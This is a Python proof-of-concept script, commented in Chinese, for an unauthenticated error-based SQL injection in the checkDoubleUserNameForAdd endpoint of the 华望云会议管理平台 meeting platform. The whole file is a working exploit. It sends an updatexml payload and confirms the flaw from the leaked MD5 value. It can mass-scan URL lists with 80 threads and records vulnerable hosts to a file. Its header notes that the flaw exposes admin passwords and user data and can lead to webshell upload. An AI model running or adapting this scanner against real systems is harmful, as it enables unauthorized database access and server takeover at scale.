# -*- coding: utf-8 -*-
# 华望云会议管理平台_checkDoubleUserNameForAdd-SQL注入漏洞
# title="华望云会议管理平台"
# 产品简介:华望云会议管理平台是一款基于云计算技术的远程音视频互动软件，致力于为用户提供便捷、易用、低成本的会议解决方案。该平台拥有丰富的功能和广泛的应用场景，能够满足不同用户在不同场景下的会议需求。
# 漏洞概述:华望云会议管理平台 checkDoubleUserNameForAdd 接口存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
# POST/SQL报错注入

import requests,argparse,sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def bunner():
    test = """                                                            
                        \x1b[38m██╗  ██╗    ██╗    ██╗  ██╗   ██╗
                        \x1b[36m██║  ██║    ██║    ██║  ╚██╗ ██╔╝
                        \x1b[34m███████║    ██║ █╗ ██║   ╚████╔╝ 
                        \x1b[35m██╔══██║    ██║███╗██║    ╚██╔╝  
                        \x1b[31m██║  ██║    ╚███╔███╔╝     ██║   
                        \x1b[33m╚═╝  ╚═╝     ╚══╝╚══╝      ╚═╝
>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
    --author:Kucei  --Vession:华望云会议管理平台_checkDoubleUserNameForAdd-SQL
<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
\x1b[0m"""
    print(test)

def main():
    bunner()
    # 初始化
    parser = argparse.ArgumentParser("华望云会议管理平台_checkDoubleUserNameForAdd-SQL")
    parser.add_argument('-u','--url',dest='url',type=str,help='Please Input URL')
    parser.add_argument('-f','--file',dest='file',type=str,help='Please Input File')
    args = parser.parse_args()
    # 判断url/file
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        # 创建一个列表接收 文件夹的URL
        url_list = []
        with open(args.file,'r') as fp:
            # 遍历文件夹内的URL
            for url in fp.readlines():
                # append 往列表添加元素
                url_list.append(url.strip())
        # 创建线性池
        pool = Pool(80)
        pool.map(poc,url_list)
        pool.close()
        pool.join()
    else :
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")
def poc(target):
    url_payload = "/ajax/checkDoubleUserNameForAdd"
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0',
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
        'Accept-Encoding': 'gzip, deflate',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'X-Requested-With': 'XMLHttpRequest',
        'Content-Length': '88',
    }
    data = "userName=1%25'+and+1%3d(updatexml(0x7e,concat(1,(select+MD5(5))),1))+and+'%25%25'+like+'"
    # proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080',}
    try :
        response = requests.post(url=target+url_payload,headers=headers,data=data,verify=False,timeout=5)
        print(response.status_code)
        print(response.text)
        if response.status_code == 500 and 'e4da3b7fbbce2345d7772b0674a318d5' in response.text:
            print( f"[+] {target} 存在漏洞")
            with open('华望云会议管理平台_checkDoubleUserNameForAdd-SQL.txt','a',encoding='utf-8')as f:
                f.write(target+'\n')
        else:
            print(f"[-]{target}不存在漏洞")
    except :
        print(target+"--站点连接异常--")
if __name__ == '__main__':
    main()